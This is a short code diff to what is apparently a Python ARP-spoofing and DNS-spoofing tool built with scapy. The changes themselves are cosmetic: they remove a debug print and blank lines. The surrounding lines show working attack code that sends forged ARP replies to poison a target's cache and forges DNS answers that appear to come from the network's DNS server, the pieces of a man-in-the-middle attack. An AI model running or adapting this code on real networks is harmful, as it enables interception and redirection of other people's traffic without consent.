@@ -64,7 +64,6 @@ class ArpSpoofer(object):
 
         packet = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.spoof_ip)
         scapy.send(packet, verbose=False)
-        # print(f"Spoofing target ip: {self.target_ip}, mac: {self.target_mac}. with source ip: {self.spoof_ip}")
         self.spoof_count += 1
 
     def run(self) -> None:
@@ -105,7 +104,6 @@ class DnsHandler(object):
         """
         process_list.append(self)
         self.process = None
-
         self.spoof_dict = spoof_dict
         self.real_dns_server_ip = REAL_DNS_SERVER_IP
 
@@ -120,7 +118,6 @@ class DnsHandler(object):
         """
         real_pkt = IP(dst=self.real_dns_server_ip) / UDP(sport=pkt[UDP].sport) / DNS(rd=1, id=pkt[DNS].id,
                                                                                      qd=DNSQR(qname=pkt[DNSQR].qname))
-
         pkt_ans = sr1(real_pkt, verbose=False, iface=IFACE)
         fake_pkt = IP(dst=pkt[IP].src, src=NETWORK_DNS_SERVER_IP) / UDP(sport=53, dport=pkt[UDP].sport) / DNS()
         fake_pkt[DNS] = pkt_ans[DNS]
